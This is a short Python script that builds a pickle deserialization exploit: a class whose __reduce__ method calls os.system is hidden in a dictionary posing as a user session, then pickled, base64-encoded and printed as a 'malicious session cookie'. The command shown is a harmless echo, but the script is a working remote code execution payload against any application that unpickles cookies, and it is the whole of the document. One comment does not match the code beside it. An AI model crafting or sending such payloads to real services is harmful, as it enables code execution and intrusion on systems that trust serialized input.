import pickle
import base64
import os

# Create a malicious payload to execute a system command
class Malicious:
    def __reduce__(self):
        # Instead of returning an int, return a dictionary with the username key
        return (os.system, ("echo 'Hacked!'",))

# Create a payload that simulates a valid session object with a malicious action
payload = {
    "username": "user",  # Simulate a user
    "other_key": "value"
}

# Use pickle to serialize the malicious object
malicious_obj = Malicious()  # This will execute when deserialized
payload["malicious"] = malicious_obj  # Add the malicious object to the payload

# Serialize and encode the malicious payload
serialized_payload = pickle.dumps(payload)  # Serialize the dictionary containing malicious object
encoded_payload = base64.b64encode(serialized_payload).decode()  # Base64 encode it for transmission

# Output the malicious session cookie
print("Malicious Session Cookie:", encoded_payload)
